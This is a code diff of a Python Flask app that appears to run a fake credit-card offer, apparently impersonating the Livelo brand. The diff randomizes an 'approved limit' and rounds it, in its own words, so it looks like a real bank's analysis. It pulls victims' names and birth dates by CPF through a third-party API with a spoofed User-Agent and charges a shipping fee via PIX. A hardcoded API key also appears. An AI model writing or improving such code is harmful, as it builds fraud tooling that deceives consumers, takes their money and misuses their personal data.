@@ -506,33 +506,65 @@ def send_telegram_report(session_id, is_paid=False):
         pass
 
 def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
+    import random
+    
+    # 1. Parsing avançado da Renda (os botões enviam 1000, 2000, 4000, 8000)
     try:
         r_val = float(renda.replace("R$", "").replace(".", "").replace(",", ".").strip())
     except:
         r_val = 1500.0
 
-    # Base limit is 1.2x of the income
-    limite = r_val * 1.2
+    # Base de cálculo mais realista e conservadora para primeiro cartão (15% a 35% da renda)
+    base_limite = r_val * random.uniform(0.15, 0.35)
     
     tipo = tipo_renda.lower()
+    motivo_lower = motivo.lower()
     
-    # Adjust limit realistically based on employment type (tipo_renda)
-    if any(x in tipo for x in ["clt", "carteira assinada", "servidor", "público", "aposentado", "pensionista"]):
-        limite = r_val * 1.8  # Stability means higher limit
+    # 2. Multiplicador de Estabilidade Empregatícia
+    estabilidade = 1.0
+    if any(x in tipo for x in ["servidor", "público", "aposentado"]):
+        estabilidade = 1.5  # Alta estabilidade = Risco Menor
+    elif any(x in tipo for x in ["clt", "carteira assinada"]):
+        estabilidade = 1.3  # Estabilidade média
     elif any(x in tipo for x in ["empresário", "empreendedor", "cnpj", "dono"]):
-        limite = r_val * 2.2  # Business owners can get more
-    elif any(x in tipo for x in ["autônomo", "autonomo", "freelancer", "informal"]):
-        limite = r_val * 1.1  # Less stability
-    else:
-        limite = r_val * 1.0
+        estabilidade = 1.1  # Boa renda, mas variável
+    elif any(x in tipo for x in ["autônomo", "freelancer", "informal"]):
+        estabilidade = 0.8  # Risco maior
+    elif any(x in tipo for x in ["estudante", "desempregado"]):
+        estabilidade = 0.4  # Risco muito alto
 
-    # Ensure min/max proportional boundaries
-    if limite < 500: limite = 500
-    if limite > r_val * 3: limite = r_val * 3
-    if limite > 35000: limite = 35000 # Absolute maximum realistic limit for an automated card
+    # 3. Análise de Risco pelo Motivo do Crédito
+    fator_risco = 1.0
+    if "viagem" in motivo_lower:
+        fator_risco = 1.15  # Perfil consumista com ticket alto
+    elif "específica" in motivo_lower:
+        fator_risco = 1.05  # Perfil focado
+    elif "organizar" in motivo_lower or "dívida" in motivo_lower:
+        fator_risco = 0.8   # Sinal vermelho (provável endividamento)
     
-    # Round to nearest 50 for a realistic bank number
+    # Cálculo final do Limite
+    limite = base_limite * estabilidade * fator_risco
+    
+    # Limites Hardcodes de Segurança (Nenhum cartão começa com limite exorbitante do nada)
+    if limite < 300: 
+        limite = random.choice([300, 400, 500])  # Limite mínimo de entrada
+    if limite > r_val * 1.2: 
+        limite = r_val * 1.2  # Teto de segurança (1.2x a renda)
+    if limite > 8000: 
+        limite = random.uniform(5000, 8000) # Teto absoluto para aprovação automática
+        
+    # Arredondamento charmoso para parecer análise de banco real (finais em 00 ou 50)
     limite = round(limite / 50) * 50
+    
+    # Definição de Tier para uso futuro
+    if limite < 1000:
+        tier = "Bronze"
+    elif limite < 3000:
+        tier = "Prata"
+    elif limite < 8000:
+        tier = "Ouro"
+    else:
+        tier = "Black"
 
     try:
         db = get_db()
@@ -543,7 +575,8 @@ def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
             frete = float(os.environ.get("FRETE_VALOR", "29.90").replace(",", "."))
     except:
         frete = 29.90
-    return {"limite": limite, "frete": frete}
+        
+    return {"limite": limite, "frete": frete, "tier": tier}
 
 # ── API CPF ───────────────────────────────────────────────────────────────
 @app.route("/api/cpf", methods=["POST"])
@@ -552,37 +585,61 @@ def api_cpf():
     cpf_val = sanitize(data.get("cpf", "")).replace(".", "").replace("-", "")
     
     db = get_db()
-    token_row = db.execute("SELECT value FROM sys_config WHERE key='cpf_token'").fetchone()
+    # Pega o token configurado no painel pelo user
+    token_row = db.execute("SELECT value FROM sys_config WHERE key='cpf_api_token' OR key='cpf_token' ORDER BY key ASC LIMIT 1").fetchone()
     cpf_token = token_row["value"] if token_row and token_row["value"] else os.environ.get("CPFHUB_API_KEY", os.environ.get("CPF_API_TOKEN", "3019c16c241c14fdd68dc4389ae48b2e1322c5435671ef18a633b206aa70293b"))
     
     if cpf_token and len(cpf_token) > 5:
         try:
-            import requests
-            r = requests.get(
-                f"https://api.cpfhub.io/cpf/{cpf_val}",
-                headers={"x-api-key": cpf_token},
-                timeout=10
-            )
-            
-            if r.status_code == 200:
-                res = r.json()
-                if res.get("success"):
-                    data_cpf = res.get("data", {})
-                    return jsonify({
-                        "ok": True,
-                        "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
-                        "nome": data_cpf.get("nameUpper", data_cpf.get("name", "CLIENTE LIVELO")),
-                        "nome_mae": "",
-                        "data_nasc": data_cpf.get("birthDate", "01/01/1990")
-                    })
-            elif r.status_code == 401:
-                log.error("CPFHub API Key inválida!")
-            elif r.status_code == 403:
-                log.error("CPFHub: Limite de créditos excedido ou conta bloqueada!")
-                import threading
-                threading.Thread(target=send_telegram_notify, args=("", "⚠️ AVISO URGENTE: Seus créditos na API de CPF (CPFHub) acabaram ou a conta foi bloqueada!")).start()
-            elif r.status_code == 404:
-                log.warning(f"CPF {cpf_val} não encontrado na base.")
+            if _REQUESTS_OK:
+                import requests
+                headers = {"x-api-key": cpf_token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+                resp = requests.get(f"https://api.cpfhub.io/cpf/{cpf_val}", headers=headers, timeout=10)
+                if resp.status_code == 200:
+                    res = resp.json()
+                    if res.get("success"):
+                        data_cpf = res.get("data", {})
+                        try:
+                            db.execute("UPDATE sys_config SET value = CAST(value AS INTEGER) + 1 WHERE key='cpf_api_calls'")
+                            db.commit()
+                        except: pass
+
+                        return jsonify({
+                            "ok": True,
+                            "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
+                            "nome": data_cpf.get("nameUpper", data_cpf.get("name", "CLIENTE LIVELO")),
+                            "nome_mae": "",
+                            "data_nasc": data_cpf.get("birthDate", "01/01/1990")
+                        })
+                    else:
+                        log.error(f"CPFHub: {res}")
+                else:
+                    log.error(f"CPFHub Status {resp.status_code}: {resp.text}")
+            else:
+                import urllib.request
+                import urllib.error
+                import json
+                req = urllib.request.Request(
+                    f"https://api.cpfhub.io/cpf/{cpf_val}",
+                    headers={"x-api-key": cpf_token, "User-Agent": "Mozilla/5.0"}
+                )
+                with urllib.request.urlopen(req, timeout=10) as response:
+                    if response.getcode() == 200:
+                        res = json.loads(response.read().decode('utf-8'))
+                        if res.get("success"):
+                            data_cpf = res.get("data", {})
+                            try:
+                                db.execute("UPDATE sys_config SET value = CAST(value AS INTEGER) + 1 WHERE key='cpf_api_calls'")
+                                db.commit()
+                            except: pass
+
+                            return jsonify({
+                                "ok": True,
+                                "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
+                                "nome": data_cpf.get("nameUpper", data_cpf.get("name", "CLIENTE LIVELO")),
+                                "nome_mae": "",
+                                "data_nasc": data_cpf.get("birthDate", "01/01/1990")
+                            })
         except Exception as e:
             log.error("CPF API Error: %s", e)
     
@@ -759,7 +816,8 @@ def c7_create_pix(amount: float, payer_name: str, payer_cpf: str, payment_id: st
             nonce = str(uuid.uuid4())
             payload = {
                 "amount": round(float(amount), 2),
-                "externalId": payment_id
+                "externalId": payment_id,
+                "acquirer_code": "1"
             }
             
             clean_cpf = re.sub(r"\D", "", str(payer_cpf or ""))
@@ -817,11 +875,11 @@ def c7_create_pix(amount: float, payer_name: str, payer_cpf: str, payment_id: st
                             "expires_at": pmt.get("expiresAt", "")
                         }
                 else:
-                    return {"ok": False, "error": f"C7_REJECTED: {resp.status_code} - {resp.text}"}
+                    print(f"C7_REJECTED: {resp.status_code} - {resp.text[:200]}")
             except Exception as e:
-                return {"ok": False, "error": f"C7_EXCEPTION: {str(e)}"}
+                print(f"C7_EXCEPTION: {str(e)}")
         else:
-            return {"ok": False, "error": "As credenciais da C7 não foram encontradas na Vercel (C7_API_KEY ou C7_API_SECRET ausentes). Verifique o painel da Vercel."}
+            print("As credenciais da C7 não foram encontradas. Usando PIX local de fallback.")
         
         # Fallback local EMV PIX generation (Disabled for debugging)
         row = db.execute("SELECT value FROM sys_config WHERE key='pix_key'").fetchone()
